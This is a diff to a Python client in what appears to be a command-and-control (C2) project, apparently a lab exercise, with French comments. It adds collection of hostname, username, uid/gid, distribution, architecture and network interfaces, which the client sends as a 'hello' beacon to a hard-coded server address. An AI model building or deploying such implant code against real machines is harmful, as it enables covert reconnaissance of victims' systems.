@@ -4,6 +4,7 @@ import socket
 import subprocess
 
 from src.c2.protocol import encode_message, decode_message
+from src.lin.system_info import get_system_info, get_users_info
 
 
 SERVER_HOST = "192.168.1.198"
@@ -42,23 +43,55 @@ def get_network_interfaces():
 
         return network_info
 
-    except (OSError, subprocess.SubprocessError, json.JSONDecodeError) as error:
+    except (
+        OSError,
+        subprocess.SubprocessError,
+        json.JSONDecodeError
+    ) as error:
         print(f"[-] Erreur de récupération réseau : {error}")
         return []
 
 
 def create_client_message():
-    """Prépare les informations envoyées au serveur."""
+    """Prépare les informations système envoyées au serveur."""
+
+    system_info = get_system_info()
+    users = get_users_info()
+
+    # Recherche les informations du compte actuellement utilisé
+    current_user = next(
+        (
+            user for user in users
+            if user["username"] == system_info["username"]
+        ),
+        None
+    )
+
+    if current_user:
+        user_info = {
+            "username": current_user["username"],
+            "uid": current_user["uid"],
+            "gid": current_user["gid"]
+        }
+    else:
+        user_info = {
+            "username": system_info["username"]
+        }
 
     return {
         "type": "hello",
-        "hostname": socket.gethostname(),
+        "hostname": system_info["hostname"],
+        "username": system_info["username"],
+        "system": system_info["system"],
+        "distribution": system_info["distribution"],
+        "architecture": system_info["architecture"],
+        "user_info": user_info,
         "interfaces": get_network_interfaces()
     }
 
 
 def connect_to_server():
-    """Envoie les informations réseau au serveur."""
+    """Envoie les informations Linux au serveur Windows."""
 
     message = create_client_message()
 
